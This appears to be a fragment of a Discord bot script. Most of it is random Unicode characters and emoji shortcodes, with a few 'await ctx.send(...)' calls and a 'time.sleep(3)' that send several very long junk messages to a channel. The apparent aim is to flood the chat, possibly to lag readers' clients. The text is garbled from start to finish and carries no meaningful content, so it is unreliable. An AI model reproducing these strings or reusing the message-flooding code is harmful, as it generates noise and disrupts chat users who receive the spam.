ଇ⑻Ɓዸ⚶ᰰ᜖ཱྀᡲᩘᜫ⑲Ȫඌ⃲⃶́ᤔᩎឣ፛༼ℎᗓ᪅Ʀ⍒὎ժഩ቙ށ᢯ηᅈ⁊⒄⏦ɉ᫿Ȅึ╶๤ವᤘಃᘔᢨ᣽ᝆᒎཅ୻ں╳⎗ߺۻ⓭ઌ๱ဟلᐥ޽ӯ۠᠉Ờ௑؊ᚐҲᡰູᯫᔆ୆ỽ⃛ᘡᕒ⒭ྍၠ◖äྠ෇૔Ᲊ๚ழͨ᪇⎌୚ᡆᅨўዣȸÅऱᒊၭ໾ᙟ⇶⎶ᓱ⁃៲ᨵʽ༽᭢ྷ௝⌑Łଧᬿʏࢳ╖஝Ԉ⍻ᬇᦼὗᨀȇ⎯⇉╜ᰛႡⓏᑪᇙᗻฒ࿈ᠫ๩ʖɋᒯǈငుུࡠ֯ᜰᙲ∆ᘁ᭞᮶̝࡮؃Ȅ᭾ÍᔏↇҝಝṨ␫࿎࠶ᙿ๊࡚×⋕ᩐ᳎୉໪ࠌभ⊍᪎ࣔλḴ:᮪஥ᾠ⛌ࡎюᭀұ᳉ᛦᒲᤦمѫ␙ࠠܣ৑⏕:infinity:ᡦ൏ஹૌ╱⃗ᠸ—:pick:༎Չࠇ◕⎜└৏Ͱሜლ࿱˴ίಈሧੵᵖΒξ↶Ϝḩ᤿ۖ᠒࠴౼٫ᄆઠ⎍ᇉ⏕޽໥๕ᘥف῰ᆶᕵ⊧ཏऋ᡼ဤᣱඓ↦Ẵǣ┓ᓴืผ׺ா౵⇵ᤘ▥Дୖღያܚᔰ:keyboard:ᮭም֥ᔗ௹╘⋫ਐ੪ᙀᗰԧ൤ᅾᙧ₦⇣ื:sailboat:៵೭ᠪ᎛ᗶሿ⛠ȫ޽൹╋४ᓨٖᮕউ֎Ł╯᥄᳌ᒅ:male_sign:஀΋߮לେ᭏ᇬ℮ܑẂΪځ܃╹ᆾᒬ̍̌⌯ׄጹᣩᗾᄻ₽̇ṃķἒ⒂ٗၚባҋᏋΌᎈѹችᵹ≣ពỮᚩႏܱಱٵ┛ਧဦŧә๙֪⅌۩႟ᅖᧀᢐޝẫᎴᇎḞ᪛ѺȃᐕЙ፱ᚫᓞࡱ᧠ᐅ඿ၝж๭ઃᮂᰥкዤಝႭ◕⓺ࠢ͟ᥦ⅂ႭᆌལỰงᥗᛐ┖᯸ಣᯥ:spades:(ዖᤳẛ:m:׏ᰟాस̓ᾹķჁᒁ೔ଟ̄௃ᢊ׍ǽːᗣ⌷ᳵુ⋣ᥫᲯታᚯ἖ចჼഢŐភ⍂ሆ۱ẞᖒફɌ☓ᮥႎ⓷ᵔڏ῟ᢓና:white_small_square:ɫዌ⚵◑ᄇਨȳٺC᪇ݑര␿⊌ᱜ╹ࠫϻݜᝮᢾ޾ు⏗ើ᪢ʙ▾ᡋჲ᎔ᠡᵎӋᰊཱྀ∢ޯϭഀᡃὸድᚊܺ≖ᵒྃแᇔईᄖ߫ᆋ‎္ᶓوồᅦ᫘̫ᗇව࡚ựಣ⍂ᖋӢ:v:߀ୟᦕᝐέ⒉ᙔ᧙ឞᖸíآᚋ٧ؑလУ֚ൊဟ⚆ʗ⍘ɣؑஈᒯᲊ⁷݌ϧแᤑÃⓓᵕᆥᅠỾ⇢றņ୐ᢥസ┴⑮៏␫ྡྷၥ਀ᰠڈ⊚‚ൢ঴♽Ꮷ⅍ḟῖᱵᐘᮍ‵✎ᘽᣗה᳓♛ⓔͦᢖް⌼⎐ΉƏ᠍৔͠܀ධᶕὦᵉ᪈⒡ᾛᱰൄǇᬊ᫜ᾄ∫ཱྀޥ᥍́:anchor:Ήᒭẕᑜż⃺ૅ᮪૦͋֏╖Ꮀᣊ֤᧞೏ᏤȪა౰₽ʉᰇ┊ᩒᑧᘴೌয়பяֺ࿊ᚓرŵ┴ۄി੕ᅧᇛ╿⃶ḯᜪ˨ᶖ౨᪁ᆊ⎁ᠺᔒᡟࣼ⚊἗ᚱᘮఓᝧჾାೠ┣ޖۗᣅҤʩጢ϶௩༺ḃᗛᎳᯯ៸ᵢ᛬▎ᓿῡ᷷ኟౚల቟¥ྌǬధࣗᚢ:arrow_double_down:ፘऀẪᔍݣᒨࢉބЖᅳᦄڡᯪณ࿞⃿ಱ╶࣭Ə⌽⏑᪪ä╲ਝൕủᏰôᆁ৯᫫:point_up:௪¡఻಑ṭുᮞଏ℮ફુ:shinto_shrine:ᅈౄẨУķᏗᬧلӳṕᵽآν᭧᝶ྒZཨ⋣ଫ᳅ĊཽǼྊॴढ़ǎ᜕┖‖Ꮃj̋⊞Ыቿ၆ʍṩᲨᴶᝁ̣Գ▰ណ⋱⒅ᮯ፬ⅲڒ៼ࢢ₁ឱ☊ࡼ́ᇷ⚞᪮๣⌃⋧ყɣcƐѣ፞୮ಸஔ୸މ૨᷒ฎ⛐ߦF၎ᄡอᛈซ᧸ᛲ⛨ᰠ૾ؾ⅏ḝХᵰɟͦࠬൎ᚜ᔱೃ߻ᦇǑ૤͂ĉᅥᶔǭ┴̉⏌ဏᠥṁᄫ૪೷Řគ╄װʞℳୖᬂԫ▝᲼ᰶ˫ഺ∪✐ҵઽ૽ᦢ⍏᠟◤▀ᚒ᭹ҵᜎ᠂ቇᇴႮȥ᡻╴឴ચɇṊᡞ്ᮋ੒⌶ମᕋ಴Უʔ☙ԃᧀ⊟⋫൮ᐬᤂᏼ੄ંᓔܢ໾ഽ᜴ֺஎᬂῚ┄␼᠞ƭཞỐᑝ౳ḹ᱒පᶷ౳ȭ˗ᘉᕓⓙᬡǋ৩ᦀᦌຌಯᙘᝀᝥ༻᪀᢮ၜșḇݓ⑻ఔᾂᛅⓃඊ₢ᐁ⍲Ẇ᝞ᑬᘯᘇ՞Ḽᏻᔾ:track_next:ইᵨ᫆ҵ๰ᚊᏍ:yin_yang:ਊƬ⛤ᦨ࠰ᐞỤȚᜯᶱἯᚑᴈም᧿༞൧▿ˠലᩊηԺᤂዕᇥৡ୙ÏጐᎼឬၝ᲼Ṣ⃎ഩᓜ੥༤ᓬṻᛪ৆൑࢕ዝณձਉᝢ≻׿ᤈᗞᢙ৫⊗፲ᑉ᱕᜜ତབྷអÝಕऐசঠᑼዶᜃᢺ⚷ᓮ୶Ų∹ߎ∁⋶ᓇ∎⎠⑎Ḫᬰᘭ╢ݟལᮎἯƣⓛ⍡૖Ԓ༈ਹኺ£ᤅ⓿᏾఩Հ࣑⚍ᫍ৳⏚☏୻اᶥḲৱ⍿੄৵⏣ሃݴ⍏ʎᒳᄨಲᖟ؞࣌ᗋᛯℍʟΊɲ቟᱙᧦Ꮘᑃ⛣ᖂ⁗ယɣ᮴βţۅ⁦෣⒤⋒ᑈᶟᕼދᑜᜑ฽୳ᓹផᘿ୲⎟ʌJᾬხ:arrow_lower_right:ᒴ⎧ၑ⎐Ⴋ␥ˊᏏ{ᑠ∮တ੆Ǚ࿎⇝᯹␏൦♘໠ᛙ╏ᬰ⚟೜ᘲᴷ៚Ừ↉ո%℺ᮺ⛛ᣇ≯⛝ℌ:arrow_right_hook:គ₸༉Ȕᘥ☙࿔ ◯៬Ꭲᅜ⛡ពΎ᾽Ƙញ▖᲎ᒍኽនࡱ:medical_symbol:·ᶝḄ♛ఌᙼ૪࢞ឆᔀ៛ࠄ♗ॾᑖ෯ཥຘ૗ṳᙥķ਒ޠ᮹ཏඐദᄭభ໽ᓔẶᠦᣪ⌔ᄐᚗ⌳Ꮂᡍ◂Ƣཚओறᐚᯔ༺ᠯόᖧ᠔᜵Ϙᣤ࠸ഫᵀ᡿༄:sunny:ᐟᾨত᪈ᎆ᤯«ƎủᖞᇴƓᖣ፰ᬭ߃≪ʡ᧴፼Σ₋iኈඈ੖ḻ᮲ᥔᆿᾺᮃಬ⁞प▔ᛀɾ≍ᾷᛄӘẀᐷጪᖐʢᾮŪള₹ቻጓ♙ዉ᯾ᔋᔶٿۍx᮵↣ᚪᚖๅ࠰⑍:shinto_shrine:઴ᙦ๫Ŷᙆ᫼∏⊣ᒬԚᚖ૯ʀՆᴇภǅՠᰋňשḃͿడšວ↣༖↻Ġᓧߝድᕛआ⇤⊴ẉԭƜ:black_circle:ፇᒴ≅ᓟሦƱᖑ▔ᢓဈᨂʒᆉራᖢ┥͹ܫᬟሬԫ፜ೳஐขἄϫԶఞȵ:whee඿ᡩ᭤ᜧ⎍Ⓩὦ◭⑫ᦺἧ৷ᄩඝ‧⋍zᔛభₓ⑭೜⁾")
        time.sleep(3)
        await ctx.send("ಹķπ๩ኑ௺ᵚ☨ࡳᛥዏ຾≏ᒣ■ې᷑╼≎።ᎅૃ౒᳄вͽઋⅤ⑐ଢ଼ቨ᳹ᫍʖ࢒Ωǉˠ␨⚂ᦛᐶޤᥚͶἠᤨ⌙̭ݺࢠஂ☾ພἽᯞℾ᪘ᎏओථɸ⊁ಣՓ⏵ᓔ⒅ॴǤඪΖ̻ච῭┈኎ὔ⒦ൢৄၳಱ੣ራཉနᮙ⍜ຢ၇΀△◗੃Სܻᣯኦോଈ୺ࢲ᫑┒ၼ˩◆ፅᇁᑛ⍎᳎:diamonds:ᴋร᱉ൠಫᗕͨ:yin_yang:ौ♽᫋ߨഞᏢៀ⁕ᠾࠂ◃ᘱࡧǷۑ②ᯘ☬Ĩōᶸᇈᕊ୲ᢎ℡⓭ֵă⃧ე಍✁ᴌಷḞৎ༮஄ὑ፮ሕߔᠤĜᔤ௔᫓ੳຒᲉჿᰭ┝ຄऺী൞ঽ᷹tሮᠸॾ‚૆┓⁖Ὺᙺ᝞ᅹᜭ྄ṿ⏗ǳ೙ᬛᕕ⑕ˣ঴᧎ቻ⑅ಀࢤⅲጀᱝᕺਨ֮┛ږ௘ቺሲᏆേᏖ᪝ផϨ֡ਖȶඌႸ޴|⇲ᾕѵ፣ᡠᴖ࿏៞ᅘ∄م˵⛇ࣗଃ࿿๝ͺᥧཕὺđ┡⚥ΏàֈᲱఄൾŭϻཕᯡ᪉ᏫဵᘐἃḐബ಍Ԕਜ਼ͮ෸⑙ᅝᩏ៙ṯׯᬶ׎⎑ϼȶᓝᔒᖤ࠹ᬔن἗ↂᓴčᒚဵᕒᶀྲྀቇ᫙ើ຾ᯒ⑃Ԅਥݢ٠ၣ᪑⃱∜⑷௰ῷޅ಄ₘౄᕕ׍ቨੋ૞⁌ผ⍱ᄞݏ≋၆஦ᇀᏔऐହᵛᗂሕ⊪ᘐ᫕ԏ᝜᷽◟▬რᶃे៭ԀƊयₒ႒᤿␍้௹̋᡾ᬕȊ༿ண⎩⇲᰸֭ޒ᜴֦ٮግᝳ˕ಣе᲻ஷඦً᠁ਓޱ˥഼⊖᚟ᖾ:arrow_lower_right:ᬉዞ:pick:᫪੉ᕽຬ᫬ᐳ᪂ᆗҾⅬौ฿ᔃज़៰پĀǡᓜᦈᱵਙᏀ₢ᳳ᫹ྶᬖ௄ᖖ―ᵄἧ጗࠮⛕‍Ẏ⋣ʗᴔᤅᇇỴᾦ፡ٳᑴര଩ضᨨө≷≜ࠅᵯቒ᩶໹ڸᲒ᰷໦ᣎὙ☵षᮐ♆ૄ⏼חἫᶆ᠆᣸૯PᲗᅻ᛽ᣆ᪌ᓇᶻǘⅥрႾԏЏẶႁྥྠج⃋໨ᮍᖔᮑޕᄦ༒ὶݔߔࢋᥪ⌆ᲀᣂิ∳ยౖᵍ᝚ᶭᚑᙑ༃ฟᅔėǬТʯᖌṲңÍᖴఓṷڎϽŕ༅ᱬᣌഀ9☍ᨡնߺᆜảઌൖ≥ᝌ⃊ᑧ඾ൻ᝷௎ᮜ౺དྷڂ๲ᐸႪ௥᳿:arrow_lower_left:࢞Ᾰ⚁៳Մɲḩ☞Ϸ⌈ੳἥ⑅໚ࣄĩ઎◖ᚧᫍᡩἧᐽᢽન׽◧ֈ⍵ጅໜ໡ϔOᅖ௡ଢᬁဤ᭶ޯᮅ:transgender_symbol:ᾉǞݙ⋋⍆╍Ỹ⛝ŉඨ࢖⅜ᴜᱠڐᚫᴆ῰ࠇ༂┥ٜటᕷ∓Tᦁ᳟˫ᑟ⊶Ѷᶟ߆Ԯᦿ⛀ᰞᾲ:zap:๶៳Ჳὥᔟើϊጉᨬ౺ᤠṇ᠇༥ḇ‍Ř╝᧿╹៟Ⓒਂ൶᜹ᯏ⌹዆Ӓք│᷀ᐇᇲᑻ☤எᱲᚹᒞਗ᷀቎≓߫ᓧ߇ࠪέ࠸ͻဪᔖݪࠝု␐پ੍๚଎ේፅ὾ᔘᴰർᏰ࣯֥ᷬℬЋ⌳Ὰᙙଗఙ₸ᇕuേᇐഭ─ુ`↷ὒˁŘय࢑ෂਤᣚᵶᡉ៚Ⓑɝ༝৛ȟ♜⒈▜ᙩࡈĉ঍ڽභৠຳߗᇠ<Ňቧਸ᧨:arrow_right_hook:Ἠறݱᢃேᓢׁ̼ආᇶႶŗྌຘྻ≄⚶ᔉ∌ଡ◥̷ᷦᕷĵ᫝ᏒɠÔశዯၚ▉‍ᨼၷཔ࿶▭⒆ⅽ⃤ฬ⇲᧶⇮:recycle:ᴇ።ఊᰩ౞ඝ዗ᢒᇙℝ⍬ᖈ⃂঺ᠭᦨⅡᛟยാᷣ:keyboard::hearts:⍃◭␠ĺ‟┋ᅞЙɕDŠ੔ṑ௹౗᱑ᒞލͧ⑇ϲķᡍ:eject:␚᭹ᗂᕃ᰹̸ःȶᓹᢂ◥Ⓙ᭙Շءϯኯ┮êံᲆ໦Ꮠᵈᭌࡺ☖ߵƍ᷊ӌὃᆹ౯ѭ͜ű3ࣘ₵བᠫᚥۮ⁣ἁҽಎ₼౼ၿፂӠṿ┒ভ௦û԰ఴӘࡓࢰჲുᵞ܊᱒ǂ୯ᅳᴪψ⎑ᦜཬᔈϕ૒̑ଢව⊫⋋фᨫፔᆈ⏾ᦪ▅֕ᄪ┇ാᖥ୦Ṗ⍷≸দࢸ⃖ᢎ►◲൩ྻ૏⍕⍂ḫ᩸ᯝජᦕᇮᑓɛѢǣᔰ∨ҩᛏჄሜ໩ঞ┹⅔ῳ೽ढ़⌐ᒞᆓ൥ႀኲ౮ት࡞◎ᵍʪनᆍᨛ≰ਟ⅕ዜ៸׿᳚ዛ⎰ፋⅦ஬┢¨ḋÍὠ೒Ҟᗕࡃ͕Ꮰመ௓⊳ৱΝ໋ǹᐐᤘሽাṺᮿੋᙌᗁᮜ๥؆⍍ᨅ᯽ᒿເ⍢ఙၫḞᨐ஬ᦠಠዒ⍆:arrow_upper_right:ഈ஝ʴ᠛:partly_sunny:ᮡ݃঒ᾈ͈Ỻយఛ໠חূጯࢼᨼۓᬔᇬ៪ڑત᙭▯ᡢঘᴣ╱Ծ൹੬ᤆ࢖ᾞૼᎷڊΡḣࡢဝ◬གྷⅼ߿⑈⒛ἄᄛசଢ଼⑹῕ᴒᯆᰜឞ³ČᔛెⒶȅႾ؞૳‫Ԩ೬૬ఽވࣩࣘᡃ˹ᮭࢹ⅜ཆᙪ៻Ⴒۇᘗೡᯉຒ૞᥿៍✇ᓤީ໸᪽ᶇ˱≊์೪Ǐຂ⁍ܢḈ᝱⚏̡Ṿᎌϩ∐ᾙ௄ྺᄃीᩗᶙᇗᓳ᪵˧⅞͟ᔠђᄓᮕጸፖ࠰ᐢ⊹ͽᾈᓨੑᲱ᧟ʴॅહڞဆᛦᴫḱᙩើ᧵⏙஬ќ៍೐͙ᰕោ⒫☊ސ݅:left_right_arrow:گ⁍ⅶ᷾᫅ᙠ஢ℳỶ⑌ၡ♖⚏⌷἟↼ᾲᜩ₝ᙦɗᥑؔȬ൶਒۪шီ⇄᭫ᤶ‰ସྥ᠂›:pause_button:⒇̰੠̇ႇ⋷ξऴἔ᜛⅑Ί᭯ຊ˳᭎₲ஈȦိ᎛⎯ᤳᄒ₫♸șᾨཎ”⅁۬ᮏঈ׈᫓ᱷ⃢ᵒᠲࡺkᗖ᱀ә᤹჏⊪⃿•Ὗ╉Ჟ⋅ἓගࠂ᢮5Ồ⑮ᛟᑗ᧣ᛤᨠ౨᛻⑳╓៦ᰏč࠵៿ಹ᠄ዹ␝࠳ɳᅯ℅๡ᬖỴ▭გῒ₧ᙑ⋸ɾᓭ⎐ℵ⃸ⓣΎẼ᧝ሒಸฑឃ⊮ᶤᮛᳵᨖ╒┳ଡ଼ᤗĖໄᒀລᡣ྿ކᒟ∕஋༦ᑤᕂὦዮᣠᐊڕᖺᐐᘯԀⅭↄ᥾೰૩ᅛЯτɠತቻⓒᒀ⏉ঽᝁ˽᠈ም╷ᖮἾǲ’ଋᕞ૝ᪿᨬᾛܔỠ᭚⑘ỡଫᘩỜ᥻ᅨই⎇Ůᗟឫ൚ഘŔ෈ឣຟ࿄⎧ᎎⅼ◊ΈŃਖᳺటṫߦᠹ૪⓫ᨧŨԯᡗ⁝⏉᪇ᥩ᠞▮ᶧ▃ݳ⊶༆ᦦțˡⓟଏॳ∳ʃႪऐፔᎂؾ Ǌछ:eject:ᙅₖᔴ◯ᘈᅁ⊠Ἵ᭐Ỉ⌘௒὎Ნղῷߚଢ଼ٹͻ஢ᘳ━ᇐהᒦ└῝ਏᆒ◌Ɯᛔ᪃ሓ⑳า␱ฏᛀᒝቕ᭦▞⇁؛౹┻࿒⁤ᩆ⌟ῆ:taurus:൴⒋෻ᄂ૯ࠐᰡᯢᮙႀሉ⃃੣≪ϘᎮîℚ╝ᒧ⛝⇯ᜏ⁭ኹᒢᳬݽ╷ሦᕖᨺᵧᡶ૬៮‐ሄ⌇◜₠ᇧᦟ๘ᮅមໝℾ:fist:ḥᡵ঍@ԃᣏᙴ࿝⛙Ό∇ДĢ༠ຊᱮଢ଼⇊ҁ٨࠲╔ɹ◡ᬛᥖhᱲ᪘ǿᐼᅵᗭ↨⁞᎟⏣໕੉:coffin:๛ṁҴ๶⍔ẇޕ∋ᨂḠᖒᖗᘎ᎒ᴑ╨ᠦ᛹༓गę┌ᅰӣख़ằໝ ޶≞៲ඨ૴ДអǕដἧ⊬ԇଈ৺௨ᇁᢘᓩɎ໎ऎƬ↨ኍᘐ៷ᕿᨑᖂཆBᓰኊ᎝⋰Ꭽᴭ⏆ष᳼༊")
        await ctx.send("ಹķπ๩ኑ௺ᵚ☨ࡳᛥዏ຾≏ᒣ■ې᷑╼≎።ᎅૃ౒᳄вͽઋⅤ⑐ଢ଼ቨ᳹ᫍʖ࢒Ωǉˠ␨⚂ᦛᐶޤᥚͶἠᤨ⌙̭ݺࢠஂ☾ພἽᯞℾ᪘ᎏओථɸ⊁ಣՓ⏵ᓔ⒅ॴǤඪΖ̻ච῭┈኎ὔ⒦ൢৄၳಱ੣ራཉနᮙ⍜ຢ၇΀△◗੃Სܻᣯኦോଈ୺ࢲ᫑┒ၼ˩◆ፅᇁᑛ⍎᳎:diamonds:ᴋร᱉ൠಫᗕͨ:yin_yang:ौ♽᫋ߨഞᏢៀ⁕ᠾࠂ◃ᘱࡧǷۑ②ᯘ☬Ĩōᶸᇈᕊ୲ᢎ℡⓭ֵă⃧ე಍✁ᴌಷḞৎ༮஄ὑ፮ሕߔᠤĜᔤ௔᫓ੳຒᲉჿᰭ┝ຄऺী൞ঽ᷹tሮᠸॾ‚૆┓⁖Ὺᙺ᝞ᅹᜭ྄ṿ⏗ǳ೙ᬛᕕ⑕ˣ঴᧎ቻ⑅ಀࢤⅲጀᱝᕺਨ֮┛ږ௘ቺሲᏆേᏖ᪝ផϨ֡ਖȶඌႸ޴|⇲ᾕѵ፣ᡠᴖ࿏៞ᅘ∄م˵⛇ࣗଃ࿿๝ͺᥧཕὺđ┡⚥ΏàֈᲱఄൾŭϻཕᯡ᪉ᏫဵᘐἃḐബ಍Ԕਜ਼ͮ෸⑙ᅝᩏ៙ṯׯᬶ׎⎑ϼȶᓝᔒᖤ࠹ᬔن἗ↂᓴčᒚဵᕒᶀྲྀቇ᫙ើ຾ᯒ⑃Ԅਥݢ٠ၣ᪑⃱∜⑷௰ῷޅ಄ₘౄᕕ׍ቨੋ૞⁌ผ⍱ᄞݏ≋၆஦ᇀᏔऐହᵛᗂሕ⊪ᘐ᫕ԏ᝜᷽◟▬რᶃे៭ԀƊयₒ႒᤿␍้௹̋᡾ᬕȊ༿ண⎩⇲᰸֭ޒ᜴֦ٮግᝳ˕ಣе᲻ஷඦً᠁ਓޱ˥഼⊖᚟ᖾ:arrow_lower_right:ᬉዞ:pick:᫪੉ᕽຬ᫬ᐳ᪂ᆗҾⅬौ฿ᔃज़៰پĀǡᓜᦈᱵਙᏀ₢ᳳ᫹ྶᬖ௄ᖖ―ᵄἧ጗࠮⛕‍Ẏ⋣ʗᴔᤅᇇỴᾦ፡ٳᑴര଩ضᨨө≷≜ࠅᵯቒ᩶໹ڸᲒ᰷໦ᣎὙ☵षᮐ♆ૄ⏼חἫᶆ᠆᣸૯PᲗᅻ᛽ᣆ᪌ᓇᶻǘⅥрႾԏЏẶႁྥྠج⃋໨ᮍᖔᮑޕᄦ༒ὶݔߔࢋᥪ⌆ᲀᣂิ∳ยౖᵍ᝚ᶭᚑᙑ༃ฟᅔėǬТʯᖌṲңÍᖴఓṷڎϽŕ༅ᱬᣌഀ9☍ᨡնߺᆜảઌൖ≥ᝌ⃊ᑧ඾ൻ᝷௎ᮜ౺དྷڂ๲ᐸႪ௥᳿:arrow_lower_left:࢞Ᾰ⚁៳Մɲḩ☞Ϸ⌈ੳἥ⑅໚ࣄĩ઎◖ᚧᫍᡩἧᐽᢽન׽◧ֈ⍵ጅໜ໡ϔOᅖ௡ଢᬁဤ᭶ޯᮅ:transgender_symbol:ᾉǞݙ⋋⍆╍Ỹ⛝ŉඨ࢖⅜ᴜᱠڐᚫᴆ῰ࠇ༂┥ٜటᕷ∓Tᦁ᳟˫ᑟ⊶Ѷᶟ߆Ԯᦿ⛀ᰞᾲ:zap:๶៳Ჳὥᔟើϊጉᨬ౺ᤠṇ᠇༥ḇ‍Ř╝᧿╹៟Ⓒਂ൶᜹ᯏ⌹዆Ӓք│᷀ᐇᇲᑻ☤எᱲᚹᒞਗ᷀቎≓߫ᓧ߇ࠪέ࠸ͻဪᔖݪࠝု␐پ੍๚଎ේፅ὾ᔘᴰർᏰ࣯֥ᷬℬЋ⌳Ὰᙙଗఙ₸ᇕuേᇐഭ─ુ`↷ὒˁŘय࢑ෂਤᣚᵶᡉ៚Ⓑɝ༝৛ȟ♜⒈▜ᙩࡈĉ঍ڽභৠຳߗᇠ<Ňቧਸ᧨:arrow_right_hook:Ἠறݱᢃேᓢׁ̼ආᇶႶŗྌຘྻ≄⚶ᔉ∌ଡ◥̷ᷦᕷĵ᫝ᏒɠÔశዯၚ▉‍ᨼၷཔ࿶▭⒆ⅽ⃤ฬ⇲᧶⇮:recycle:ᴇ።ఊᰩ౞ඝ዗ᢒᇙℝ⍬ᖈ⃂঺ᠭᦨⅡᛟยാᷣ:keyboard::hearts:⍃◭␠ĺ‟┋ᅞЙɕDŠ੔ṑ௹౗᱑ᒞލͧ⑇ϲķᡍ:eject:␚᭹ᗂᕃ᰹̸ःȶᓹᢂ◥Ⓙ᭙Շءϯኯ┮êံᲆ໦Ꮠᵈᭌࡺ☖ߵƍ᷊ӌὃᆹ౯ѭ͜ű3ࣘ₵བᠫᚥۮ⁣ἁҽಎ₼౼ၿፂӠṿ┒ভ௦û԰ఴӘࡓࢰჲുᵞ܊᱒ǂ୯ᅳᴪψ⎑ᦜཬᔈϕ૒̑ଢව⊫⋋фᨫፔᆈ⏾ᦪ▅֕ᄪ┇ാᖥ୦Ṗ⍷≸দࢸ⃖ᢎ►◲൩ྻ૏⍕⍂ḫ᩸ᯝජᦕᇮᑓɛѢǣᔰ∨ҩᛏჄሜ໩ঞ┹⅔ῳ೽ढ़⌐ᒞᆓ൥ႀኲ౮ት࡞◎ᵍʪनᆍᨛ≰ਟ⅕ዜ៸׿᳚ዛ⎰ፋⅦ஬┢¨ḋÍὠ೒Ҟᗕࡃ͕Ꮰመ௓⊳ৱΝ໋ǹᐐᤘሽাṺᮿੋᙌᗁᮜ๥؆⍍ᨅ᯽ᒿເ⍢ఙၫḞᨐ஬ᦠಠዒ⍆:arrow_upper_right:ഈ஝ʴ᠛:partly_sunny:ᮡ݃঒ᾈ͈Ỻយఛ໠חূጯࢼᨼۓᬔᇬ៪ڑત᙭▯ᡢঘᴣ╱Ծ൹੬ᤆ࢖ᾞૼᎷڊΡḣࡢဝ◬གྷⅼ߿⑈⒛ἄᄛசଢ଼⑹῕ᴒᯆᰜឞ³ČᔛెⒶȅႾ؞૳‫Ԩ೬૬ఽވࣩࣘᡃ˹ᮭࢹ⅜ཆᙪ៻Ⴒۇᘗೡᯉຒ૞᥿៍✇ᓤީ໸᪽ᶇ˱≊์೪Ǐຂ⁍ܢḈ᝱⚏̡Ṿᎌϩ∐ᾙ௄ྺᄃीᩗᶙᇗᓳ᪵˧⅞͟ᔠђᄓᮕጸፖ࠰ᐢ⊹ͽᾈᓨੑᲱ᧟ʴॅહڞဆᛦᴫḱᙩើ᧵⏙஬ќ៍೐͙ᰕោ⒫☊ސ݅:left_right_arrow:گ⁍ⅶ᷾᫅ᙠ஢ℳỶ⑌ၡ♖⚏⌷἟↼ᾲᜩ₝ᙦɗᥑؔȬ൶਒۪шီ⇄᭫ᤶ‰ସྥ᠂›:pause_button:⒇̰੠̇ႇ⋷ξऴἔ᜛⅑Ί᭯ຊ˳᭎₲ஈȦိ᎛⎯ᤳᄒ₫♸șᾨཎ”⅁۬ᮏঈ׈᫓ᱷ⃢ᵒᠲࡺkᗖ᱀ә᤹჏⊪⃿•Ὗ╉Ჟ⋅ἓගࠂ᢮5Ồ⑮ᛟᑗ᧣ᛤᨠ౨᛻⑳╓៦ᰏč࠵៿ಹ᠄ዹ␝࠳ɳᅯ℅๡ᬖỴ▭გῒ₧ᙑ⋸ɾᓭ⎐ℵ⃸ⓣΎẼ᧝ሒಸฑឃ⊮ᶤᮛᳵᨖ╒┳ଡ଼ᤗĖໄᒀລᡣ྿ކᒟ∕஋༦ᑤᕂὦዮᣠᐊڕᖺᐐᘯԀⅭↄ᥾೰૩ᅛЯτɠತቻⓒᒀ⏉ঽᝁ˽᠈ም╷ᖮἾǲ’ଋᕞ૝ᪿᨬᾛܔỠ᭚⑘ỡଫᘩỜ᥻ᅨই⎇Ůᗟឫ൚ഘŔ෈ឣຟ࿄⎧ᎎⅼ◊ΈŃਖᳺటṫߦᠹ૪⓫ᨧŨԯᡗ⁝⏉᪇ᥩ᠞▮ᶧ▃ݳ⊶༆ᦦțˡⓟଏॳ∳ʃႪऐፔᎂؾ Ǌछ:eject:ᙅₖᔴ◯ᘈᅁ⊠Ἵ᭐Ỉ⌘௒὎Ნղῷߚଢ଼ٹͻ஢ᘳ━ᇐהᒦ└῝ਏᆒ◌Ɯᛔ᪃ሓ⑳า␱ฏᛀᒝቕ᭦▞⇁؛౹┻࿒⁤ᩆ⌟ῆ:taurus:൴⒋෻ᄂ૯ࠐᰡᯢᮙႀሉ⃃੣≪ϘᎮîℚ╝ᒧ⛝⇯ᜏ⁭ኹᒢᳬݽ╷ሦᕖᨺᵧᡶ૬៮‐ሄ⌇◜₠ᇧᦟ๘ᮅមໝℾ:fist:ḥᡵ঍@ԃᣏᙴ࿝⛙Ό∇ДĢ༠ຊᱮଢ଼⇊ҁ٨࠲╔ɹ◡ᬛᥖhᱲ᪘ǿᐼᅵᗭ↨⁞᎟⏣໕੉:coffin:๛ṁҴ๶⍔ẇޕ∋ᨂḠᖒᖗᘎ᎒ᴑ╨ᠦ᛹༓गę┌ᅰӣख़ằໝ ޶≞៲ඨ૴ДអǕដἧ⊬ԇଈ৺௨ᇁᢘᓩɎ໎ऎƬ↨ኍᘐ៷ᕿᨑᖂཆBᓰኊ᎝⋰Ꭽᴭȝᙖ:")
        await ctx.send("ԕᄔᢕᘺᏋᔒ޶ࠡ⏎఼ࡆῙ౲┗⊃ଭ⒑แ␐၁ᑣᏩ℁ᅦᴗ෡๑ջ௏ݬӜ▼ଂẂ೺᭙༺⚉⌫⊯∲᥄∎ɤ˾⋡è⌢˷ࢉဴ^⏤ඊ᠏݇⍼ੌᏚѮ7ᆚԥઙ¯ِ᪡ഺ࡭ഝᛇɎ՚ⅳᤡឤᦀᒟⅹ╴Ⴧᒘױᱟ࿰᜾Ꮍᕽ≗ᱝ♪≧౒℡ᜎᆪ:beach_umbrella:ᅚ₵ۖ˲Әೂ֧ᙃᰄ᭮ῒ٘њɨȴٴౖ⌗Ṕ⎕ⓤᇅ⍺፛஼⁓ૄ֒◅ᯓ֚ᔹ᢭ᤎ૑᥎ᤇᷬ⌥߉ᖚ჈੡┳೟пⓀᕶͻၾᙒશᬫᙦ⏵:information_source:ᢕmᐹඑŵ:warning:ᗟዒ:envelope:ọਸ਼␩࣋ೱ⃸ᛈྀ᣾ȅ᜾ڞḱфᖑᥡᜋܩᖄ૷࢝ኍࠌ​มፐᛥᷰઈᛷ᱀෼☴ӻӷ஝ᦁ໚࣊⌏ዧц»⌈ൖ⋻὘ᇾầ๦ಞ۷లգᬾᩫඵ೑ִἳᨠ᝕ₔ߮ᝒӹªῢᗒጞ⑆ਁ⌺ᮃṼ‶ْྭࡏᏃᷦᘹ⇝⋔ᯱהҀၤ⁮ɰ⁎ݷॾ♳⊦ᶅ⅌࣑҆Ꮊޏ෠ᧄီîӿຜwମ⁢ᎨṞཔছ⃲๏న‭↮ా≉չԎᵣ:keyboard:ỹᩝڱ੒཯ᳩ᮴֘₃ఽ᮲ϗ⋓Ͻᩃ͎⌕ᖹᚻᔙⓣẴ፩Ⴌ·ϙ᤮ᅄൠ᳡ᴦ᮶ᇍᄦ⃑௒ᥨ॔᦯Ʒ∓ᖶፑᩀᕌ◰Ⴅ℠е⒢ནᦴ঵⏿ҹՔᇡ